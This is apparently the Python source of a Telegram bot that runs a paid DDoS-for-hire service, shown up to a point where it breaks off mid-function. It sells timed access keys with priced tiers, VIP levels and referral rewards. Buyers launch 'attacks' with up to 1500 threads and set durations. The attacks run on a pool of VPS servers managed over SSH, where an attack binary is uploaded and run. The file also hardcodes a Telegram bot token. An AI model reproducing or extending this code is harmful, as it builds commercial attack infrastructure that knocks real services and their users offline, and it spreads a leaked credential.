import telebot
import datetime
import time
import subprocess
import random
import threading
import os
import ipaddress
import psutil
import paramiko
from scp import SCPClient
import json
import uuid
import sqlite3
from time import sleep

# ======================
# 🛠️ BOT CONFIGURATION
# ======================
TOKEN = '7140094105:AAE7-t9N9xth7i8RdJqW1gPTynAAUcK-MVo'
OWNER_USERNAME = "GODxAloneBOY"
ADMIN_IDS = ["GODxAloneBOY", "SAMEER00"]  # Add admin usernames here
ALLOWED_GROUP_IDS = [-1002658128612]
MAX_THREADS = 900
SPECIAL_MAX_THREADS = 900
VIP_MAX_THREADS = 1500
MAX_DURATION = 240
SPECIAL_MAX_DURATION = 200
VIP_MAX_DURATION = 300
ACTIVE_VPS_COUNT = 4
BINARY_PATH = "/home/master/freeroot/root/runner"
BINARY_NAME = "runner"
KEY_PRICES = {
    "10M": 5,
    "30M": 8,
    "2H": 12,
    "5H": 15,
    "1D": 20,
    "2D": 30,
    "1W": 100,
    "VIP1D": 50,
    "VIP2D": 80
}
REFERRAL_REWARD_DURATION = 120 # Hours of free attack for referrals
PUBLIC_GROUPS = []  # List of group IDs where public attacks are allowed

# ======================
# 📦 DATA STORAGE
# ======================
keys = {}
special_keys = {}
vip_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
running_attacks = {}
reseller_balances = {}
instructor_notices = {}
VPS_LIST = []
REFERRAL_CODES = {}
REFERRAL_LINKS = {}
GROUP_SETTINGS = {}
last_attack_time = 0
global_cooldown = 60
# Add to DATA STORAGE section
all_users = {}  # To store all users who interact with the bot
bot_open = False

# ======================
# 🤖 BOT INITIALIZATION
# ======================
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=10)

# ======================
# 🔒 SECURE SSH CONFIGURATION
# ======================

SSH_CONFIG = {
    'timeout': 15,
    'banner_timeout': 20,
    'auth_timeout': 20,
    'look_for_keys': False,
    'allow_agent': False,
    'keepalive_interval': 15  # ADD THIS LINE
}

# ======================
# 🔧 HELPER FUNCTIONS
# ======================

def clean_invalid_keys():
    """Remove keys with invalid structure from all key dictionaries"""
    invalid_keys = 0
    
    # Clean normal keys
    for key in list(keys.keys()):
        if not isinstance(keys[key], dict) or 'expiration_time' not in keys[key]:
            del keys[key]
            invalid_keys += 1
            
    # Clean VIP keys
    for key in list(vip_keys.keys()):
        if not isinstance(vip_keys[key], dict) or 'expiration_time' not in vip_keys[key]:
            del vip_keys[key]
            invalid_keys += 1
            
    # Clean redeemed keys
    for key in list(redeemed_keys_info.keys()):
        if not isinstance(redeemed_keys_info[key], dict) or 'expiration_time' not in redeemed_keys_info[key]:
            del redeemed_keys_info[key]
            invalid_keys += 1
            
    if invalid_keys > 0:
        save_data()
        print(f"🧹 Cleaned {invalid_keys} invalid keys")
        
    return invalid_keys
    
def clean_expired_users():
    """Automatically remove expired keys hourly"""
    current_time = time.time()
    expired_count = 0
    
    # Check all redeemed users
    for user_id in list(redeemed_users.keys()):
        if isinstance(redeemed_users[user_id], dict):
            if redeemed_users[user_id]['expiration_time'] <= current_time:
                expired_count += 1
                # Remove expired user
                del redeemed_users[user_id]
                # Remove from special/vip keys if exists
                if user_id in special_keys:
                    del special_keys[user_id]
                if user_id in vip_keys:
                    del vip_keys[user_id]
    
    # Save if changes were made
    if expired_count > 0:
        save_data()
        print(f"🧹 Cleaned {expired_count} expired users")
    
    # Schedule next cleanup in 1 hour
    threading.Timer(3600, clean_expired_users).start()
    
def get_username(user_id):
    """Get username from user ID"""
    try:
        if isinstance(user_id, str) and user_id.isdigit():
            user_id = int(user_id)
        
        if isinstance(user_id, int):
            # If it's a user ID, try to get chat info
            chat = bot.get_chat(user_id)
            return f"@{chat.username}" if chat.username else chat.first_name
        else:
            # If it's already a username
            return str(user_id)
    except:
        return str(user_id)

def get_display_name(user):
    """Get display name for a user"""
    if isinstance(user, str):
        return user
    return f"@{user.username}" if user.username else user.first_name

def create_progress_bar(percentage):
    """Create a visual progress bar"""
    bars = "▰" * int(percentage/10)
    empty = "▱" * (10 - len(bars))
    return f"[{bars}{empty}] {percentage}%"

def check_vps_health(vps):
    """Comprehensive VPS health check"""
    health = {
        'ip': vps[0],
        'status': 'offline',
        'load': None,
        'memory': None,
        'disk': None,
        'network': False,
        'binary': False
    }
    
    ssh = None
    try:
        ssh = create_ssh_client(vps[0], vps[1], vps[2])
        health['status'] = 'online'
        
        stdin, stdout, stderr = ssh.exec_command('cat /proc/loadavg')
        health['load'] = stdout.read().decode().split()[0]
        
        stdin, stdout, stderr = ssh.exec_command('free -m | awk \'NR==2{printf "%.1f%%", $3*100/$2 }\'')
        health['memory'] = stdout.read().decode().strip()
        
        stdin, stdout, stderr = ssh.exec_command('df -h | awk \'$NF=="/"{printf "%s", $5}\'')
        health['disk'] = stdout.read().decode().strip()
        
        stdin, stdout, stderr = ssh.exec_command('ping -c 1 google.com >/dev/null 2>&1 && echo "online" || echo "offline"')
        health['network'] = 'online' in stdout.read().decode()
        
        stdin, stdout, stderr = ssh.exec_command(f'test -x {BINARY_PATH} && echo "exists" || echo "missing"')
        health['binary'] = 'exists' in stdout.read().decode()
        
    except Exception as e:
        health['error'] = str(e)
    finally:
        if ssh:
            ssh.close()
    
    return health

def show_vps_status(message):
    """Show detailed VPS status"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only owner can check VPS status!")
        return
    
    msg = bot.send_message(message.chat.id, "🔄 Checking VPS status...")
    
    status_messages = []
    for i, vps in enumerate(VPS_LIST):
        health = check_vps_health(vps)
        
        status_msg = f"""
🔹 VPS {i+1} - {vps[0]}
├ Status: {'🟢 Online' if health['status'] == 'online' else '🔴 Offline'}
├ Load: {health.get('load', 'N/A')}
├ Memory: {health.get('memory', 'N/A')}
├ Disk: {health.get('disk', 'N/A')}
├ Network: {'✅' if health.get('network') else '❌'}
└ Binary: {'✅' if health.get('binary') else '❌'}
"""
        if 'error' in health:
            status_msg += f"└ Error: {health['error']}\n"
        
        status_messages.append(status_msg)
    
    full_message = "📊 VPS STATUS REPORT\n\n" + "\n".join(status_messages)
    
    try:
        bot.edit_message_text(full_message, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, full_message)
        
def get_vps_load(vps):
    """Get current load of a VPS"""
    try:
        ssh = create_ssh_client(vps[0], vps[1], vps[2])
        stdin, stdout, stderr = ssh.exec_command('cat /proc/loadavg')
        load = stdout.read().decode().split()[0]
        ssh.close()
        return float(load)
    except:
        return float('inf')

def select_optimal_vps(vps_list, required_threads):
    """Select best VPS based on current load"""
    available_vps = []
    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for vps in vps_list:
        # Skip invalid VPS configurations
        if len(vps) < 3:
            continue
            
        if vps[0] not in busy_vps:
            try:
                load = get_vps_load(vps)
                available_vps.append((vps, load))
            except:
                continue
    
    if not available_vps:
        return []
    
    available_vps.sort(key=lambda x: x[1])
    base_threads = required_threads // len(available_vps)
    vps_distribution = []
    
    for vps, load in available_vps:
        threads = base_threads
        vps_distribution.append((vps, threads))
        required_threads -= threads
    
    i = 0
    while required_threads > 0:
        vps_distribution[i] = (vps_distribution[i][0], vps_distribution[i][1] + 1)
        required_threads -= 1
        i = (i + 1) % len(vps_distribution)
    
    return vps_distribution
            
def handle_notice_confirmation(call):
    # ... existing code ...
    
    # Send to all users who ever interacted
    for uid in all_users:
        send_notice(uid)
        time.sleep(0.1)
    
def is_allowed_group(message):
    return message.chat.id in ALLOWED_GROUP_IDS or message.chat.type == "private"

def is_owner(user):
    return user.username == OWNER_USERNAME

def is_admin(user):
    return user.username in ADMIN_IDS or is_owner(user)

def is_authorized_user(user):
    """Check if user has valid (non-expired) access"""
    user_id = str(user.id)
    
    # Check if user is admin/owner first
    if is_admin(user):
        return True
        
    # Check if user has valid key
    if user_id not in redeemed_users:
        return False
    
    # New expiration check for dictionary format keys
    if isinstance(redeemed_users[user_id], dict):
        return redeemed_users[user_id]['expiration_time'] > time.time()
    
    # Legacy support for old format keys (only allow admins)
    return False  # Changed from True to False to block old format

def get_display_name(user):
    return f"@{user.username}" if user.username else user.first_name

def save_data():
    """Save all bot data to JSON files"""
    with open('keys.json', 'w') as f:
        json.dump({
            'all_users': all_users,
            'keys': keys,
            'special_keys': special_keys,
            'vip_keys': vip_keys,
            'redeemed_users': redeemed_users,
            'redeemed_keys_info': redeemed_keys_info,
            'referral_codes': REFERRAL_CODES,
            'referral_links': REFERRAL_LINKS,
            'group_settings': GROUP_SETTINGS,
            'public_groups': PUBLIC_GROUPS,  # Add to save_data()
            'banned_users': banned_users if 'banned_users' in globals() else {},
            'vps_list': VPS_LIST,  # Add this line
            'thread_settings': {
                'MAX_THREADS': MAX_THREADS,
                'SPECIAL_MAX_THREADS': SPECIAL_MAX_THREADS,
                'VIP_MAX_THREADS': VIP_MAX_THREADS,
                'MAX_DURATION': MAX_DURATION,
                'SPECIAL_MAX_DURATION': SPECIAL_MAX_DURATION,
                'VIP_MAX_DURATION': VIP_MAX_DURATION
                
            }
        }, f)
    # ... rest of the function ...

def load_data():
    """Load all bot data from JSON files"""
    global keys, special_keys, vip_keys, redeemed_users, redeemed_keys_info, VPS_LIST, REFERRAL_CODES, REFERRAL_LINKS, GROUP_SETTINGS
    global MAX_THREADS, SPECIAL_MAX_THREADS, VIP_MAX_THREADS, MAX_DURATION, SPECIAL_MAX_DURATION, VIP_MAX_DURATION
    global all_users

    if os.path.exists('keys.json'):
        with open('keys.json', 'r') as f:
            data = json.load(f)
            keys = data.get('keys', {})
            special_keys = data.get('special_keys', {})
            vip_keys = data.get('vip_keys', {})
            redeemed_users = data.get('redeemed_users', {})
            redeemed_keys_info = data.get('redeemed_keys_info', {})
            REFERRAL_CODES = data.get('referral_codes', {})
            REFERRAL_LINKS = data.get('referral_links', {})
            GROUP_SETTINGS = data.get('group_settings', {})
            all_users = data.get('all_users', {})
            VPS_LIST = data.get('vps_list', [])
            PUBLIC_GROUPS = data.get('public_groups', [])
            banned_users = data.get('banned_users', {})
            
            # Load thread settings
            thread_settings = data.get('thread_settings', {})
            MAX_THREADS = thread_settings.get('MAX_THREADS', 500)
            SPECIAL_MAX_THREADS = thread_settings.get('SPECIAL_MAX_THREADS', 900)
            VIP_MAX_THREADS = thread_settings.get('VIP_MAX_THREADS', 1500)
            MAX_DURATION = thread_settings.get('MAX_DURATION', 240)
            SPECIAL_MAX_DURATION = thread_settings.get('SPECIAL_MAX_DURATION', 200)
            VIP_MAX_DURATION = thread_settings.get('VIP_MAX_DURATION', 300)

    # Start the cleanup scheduler
    clean_expired_users()  # Add this line at the end

def save_admins():
    """Save admin list to file"""
    with open('admins.json', 'w') as f:
        json.dump(ADMIN_IDS, f)

def load_admins():
    """Load admin list from file"""
    global ADMIN_IDS
    if os.path.exists('admins.json'):
        with open('admins.json', 'r') as f:
            ADMIN_IDS = json.load(f)

def create_ssh_client(ip, username, password):
    """Create a secure SSH client with proper configuration"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
    ssh.load_system_host_keys()
    
    try:
        ssh.connect(
            hostname=ip,
            username=username,
            password=password,
            **SSH_CONFIG
        )
        transport = ssh.get_transport()
        transport.set_keepalive(SSH_CONFIG['keepalive_interval'])
        return ssh
    except Exception as e:
        raise Exception(f"SSH Connection failed: {str(e)}")

def secure_scp_transfer(ssh, local_path, remote_path):
    """Secure file transfer with SCP"""
    try:
        with SCPClient(ssh.get_transport(), socket_timeout=30) as scp:
            scp.put(local_path, remote_path)
        return True
    except Exception as e:
        raise Exception(f"SCP Transfer failed: {str(e)}")
        
# ======================
# ⌨️ KEYBOARD MARKUPS (STYLISH VERSION)
# ======================
def create_main_keyboard(message=None):
    """Create main menu keyboard with stylish fonts"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)

    # Common buttons
    buttons = [
        telebot.types.KeyboardButton("🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃"),
        telebot.types.KeyboardButton("🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("🎁 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟"),
        telebot.types.KeyboardButton("🍅 𝙋𝙍𝙊𝙓𝙔 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆")
    ]

    user_id = str(message.from_user.id) if message else None
    if user_id in redeemed_users and isinstance(redeemed_users[user_id], dict):
        if redeemed_users[user_id].get('is_vip'):
            buttons.insert(1, telebot.types.KeyboardButton("🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"))

    markup.add(*buttons)

    if message:
        if is_owner(message.from_user):
            admin_buttons = [
                telebot.types.KeyboardButton("🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("🖥️ 𝙑𝙋𝙎 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("⚙️ 𝙏𝙃𝙍𝙀𝘼𝘿 𝙎𝙀𝙏𝙏𝙄𝙉𝙂𝙎"),
                telebot.types.KeyboardButton("👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("📢 𝘽𝙍𝙊𝘿𝘾𝘼𝙎𝙏"),
                telebot.types.KeyboardButton("🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀"),
                telebot.types.KeyboardButton("📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
            ]
            markup.add(*admin_buttons)
        elif is_admin(message.from_user):
            limited_buttons = [
                telebot.types.KeyboardButton("🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀"),
                telebot.types.KeyboardButton("📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
            ]
            markup.add(*limited_buttons)

    return markup

def create_key_management_keyboard():
    """Create premium keyboard for key management"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("✨ GENERATE KEY"),
        telebot.types.KeyboardButton("📜 KEY LIST"),
        telebot.types.KeyboardButton("🔍 SEARCH KEY"),
        telebot.types.KeyboardButton("🗑 DELETE KEY"),
        telebot.types.KeyboardButton("⏳ CHECK EXPIRY"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup
    
def create_vip_keyboard():
    """Create VIP menu keyboard with premium styling"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"),
        telebot.types.KeyboardButton("🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("🍅 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("🎁 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟"),
        telebot.types.KeyboardButton("🍁 𝙑𝙄𝙋 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉")
    ]
    markup.add(*buttons)
    return markup    

def create_vps_management_keyboard():
    """Create VPS management keyboard with tech style"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🖥️ 𝙑𝙋𝙎 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("⚡ 𝘽𝙊𝙊𝙎𝙏 𝙑𝙋𝙎 (𝙎𝘼𝙁𝙀)"),
        telebot.types.KeyboardButton("➕ 𝘼𝘿𝘿 𝙑𝙋𝙎"),
        telebot.types.KeyboardButton("➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙑𝙋𝙎"),
        telebot.types.KeyboardButton("📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔"),
        telebot.types.KeyboardButton("🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝘽𝙄𝙉𝘼𝙍𝙔"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup

def create_group_management_keyboard():
    """Create stylish group management keyboard"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("➕ 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉"),
        telebot.types.KeyboardButton("➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼𝘿𝙈𝙄𝙉"),
        telebot.types.KeyboardButton("📋 𝗔𝗗𝗠𝗜𝗡 𝗟𝗜𝗦𝗧"),
        telebot.types.KeyboardButton("🌐 𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾"),
        telebot.types.KeyboardButton("❌ 𝘿𝙀𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾"),
        telebot.types.KeyboardButton("👥 𝘼𝘿𝘿 𝙂𝙍𝙊𝙐𝙋"),
        telebot.types.KeyboardButton("👥 𝙍𝙀𝙈𝙊𝙑𝙀 𝙂𝙍𝙊𝙐𝙋"),
        telebot.types.KeyboardButton("😅 𝗔𝗟𝗟 𝙐𝙎𝙀𝙍𝙎"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup

# Option 1: Update the keyboard creation function (recommended)
def create_thread_settings_keyboard():
    """Create keyboard for thread settings management"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🧵 SET NORMAL THREADS"),
        telebot.types.KeyboardButton("⚡ SET SPECIAL THREADS"),
        telebot.types.KeyboardButton("💎 SET VIP THREADS"),
        telebot.types.KeyboardButton("📊 VIEW THREAD SETTINGS"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")  # Changed to match the handler
    ]
    markup.add(*buttons)
    return markup

# OR Option 2: Add an additional handler (alternative solution)
@bot.message_handler(func=lambda msg: msg.text in ["🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐", "⬅️ 𝗕𝗮𝗰𝗸", "MAIN MENU"])  # Added "MAIN MENU"
def back_to_main_menu(message):
    """Return user to main menu with stylish message"""
    bot.send_message(
        message.chat.id, 
        "🏠 𝗥𝗲𝘁𝘂𝗿𝗻𝗶𝗻𝗴 𝘁𝗼 𝗺𝗮𝗶𝗻 𝗺𝗲𝗻𝘂...",
        reply_markup=create_main_keyboard(message)
    )

# ======================
# 🔙 BACK TO MAIN MENU
# ======================    
@bot.message_handler(func=lambda msg: msg.text in ["🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐", "⬅️ 𝗕𝗮𝗰𝗸"])
def back_to_main_menu(message):
    """Return user to main menu with stylish message"""
    bot.send_message(
        message.chat.id, 
        "🏠 𝗥𝗲𝘁𝘂𝗿𝗻𝗶𝗻𝗴 𝘁𝗼 𝗺𝗮𝗶𝗻 𝗺𝗲𝗻𝘂...",
        reply_markup=create_main_keyboard(message)
    )    

# ======================
# 🔐 ADMIN MENU HANDLERS (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def key_management_menu(message):
    """Handle key management menu access with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    bot.send_message(
        message.chat.id,
        "🔑 𝗞𝗲𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_key_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def group_management_menu(message):
    """Handle group management menu access with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    bot.send_message(
        message.chat.id,
        "👥 𝗚𝗿𝗼𝘂𝗽 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_group_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "🖥️ 𝙑𝙋𝙎 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def vps_management_menu(message):
    """Handle VPS management menu access with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    bot.send_message(
        message.chat.id, 
        "🖥️ 𝗩𝗣𝗦 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_vps_management_keyboard()
    )

# ======================
# 🖼️ GROUP SETTINGS (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀")
def set_start_image(message):
    """Set start image for a group with stylish interface"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝘀𝗲𝘁 𝘁𝗵𝗲 𝘀𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲!")
        return
        
    # Create keyboard with allowed groups
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"🖼️ {chat.title}"))
        except:
            continue
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    bot.reply_to(message, "𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝘁𝗼 𝘀𝗲𝘁 𝘀𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝗳𝗼𝗿:", reply_markup=markup)
    bot.register_next_step_handler(message, process_group_for_image)

def process_group_for_image(message):
    """Process group selection for image setting with stylish interface"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        bot.reply_to(message, "𝗜𝗺𝗮𝗴𝗲 𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return

    selected_title = message.text[2:].strip().lower()  # Remove prefix & normalize
    selected_group = None

    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if selected_title in chat.title.strip().lower():  # Partial and case-insensitive match
                selected_group = group_id
                break
        except Exception as e:
            print(f"[ERROR] Could not get chat info for group {group_id}: {e}")

    if not selected_group:
        bot.reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return

    bot.reply_to(message, "📷 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝘀𝗲𝘁 𝗮𝘀 𝘁𝗵𝗲 𝘀𝘁𝗮𝗿𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗶𝗺𝗮𝗴𝗲:")
    bot.register_next_step_handler(message, lambda msg: process_start_image(msg, selected_group))

def process_start_image(message, group_id):
    """Process the image and save it for the group with stylish confirmation"""
    if not message.photo:
        bot.reply_to(message, "❌ 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        return
        
    # Initialize group settings if not exists
    if str(group_id) not in GROUP_SETTINGS:
        GROUP_SETTINGS[str(group_id)] = {}
        
    # Get the highest resolution photo
    GROUP_SETTINGS[str(group_id)]['start_image'] = message.photo[-1].file_id
    save_data()
    
    try:
        chat = bot.get_chat(group_id)
        bot.reply_to(message, f"✅ 𝗦𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝘀𝗲𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗳𝗼𝗿 𝗴𝗿𝗼𝘂𝗽: {chat.title}")
    except:
        bot.reply_to(message, "✅ 𝗦𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝘀𝗲𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!")

@bot.message_handler(func=lambda msg: msg.text == "📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
def set_owner_name(message):
    """Set owner name for a group with stylish interface"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝘀𝗲𝘁 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲!")
        return
        
    # Create keyboard with allowed groups
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"👑 {chat.title}"))
        except:
            continue
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    bot.reply_to(message, "𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝘁𝗼 𝘀𝗲𝘁 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝗳𝗼𝗿:", reply_markup=markup)
    bot.register_next_step_handler(message, process_group_for_owner_name)

def process_group_for_owner_name(message):
    """Process group selection for owner name setting with stylish interface"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        bot.reply_to(message, "𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the 👑 prefix
    selected_group = None
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            continue
    
    if not selected_group:
        bot.reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return
    
    bot.reply_to(message, "📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗲𝘄 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝗳𝗼𝗿 𝘁𝗵𝗶𝘀 𝗴𝗿𝗼𝘂𝗽:")
    bot.register_next_step_handler(message, lambda msg: process_owner_name(msg, selected_group))

def process_owner_name(message, group_id):
    """Process and save the new owner name with stylish confirmation"""
    if not message.text or len(message.text) > 32:
        bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝗮𝗺𝗲! 𝗠𝘂𝘀𝘁 𝗯𝗲 𝟭-𝟯𝟮 𝗰𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿𝘀.")
        return
        
    # Initialize group settings if not exists
    if str(group_id) not in GROUP_SETTINGS:
        GROUP_SETTINGS[str(group_id)] = {}
        
    GROUP_SETTINGS[str(group_id)]['owner_name'] = message.text
    save_data()
    
    try:
        chat = bot.get_chat(group_id)
